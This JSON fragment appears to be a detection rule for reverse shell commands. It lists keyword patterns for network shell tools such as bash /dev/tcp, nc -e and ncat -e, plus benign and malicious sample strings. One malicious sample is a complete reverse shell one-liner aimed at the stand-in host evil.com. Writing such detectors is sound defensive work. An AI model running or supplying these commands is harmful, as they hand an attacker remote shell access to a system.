  "description": "Reverse shell patterns that give remote access to the system.",
  "keywords": [
    "bash -i >& /dev/tcp",
    "nc -e /bin/sh",
    "nc -e /bin/bash",
    "python -c 'import socket",
    "perl -e 'use Socket",
    "ruby -rsocket",
    "/dev/tcp/",
    "mkfifo /tmp/",
    "ncat -e"
  ],
  "regex": [],
  "examples": {
    "malicious": [
      "bash -i >& /dev/tcp/evil.com/4444 0>&1",
      "python -c 'import socket,subprocess,os;'"
    ],
    "benign": [
      "Reverse shells are explained in the security training docs.",
      "The /dev/tcp path is a bash feature for TCP connections."
    ]
  },
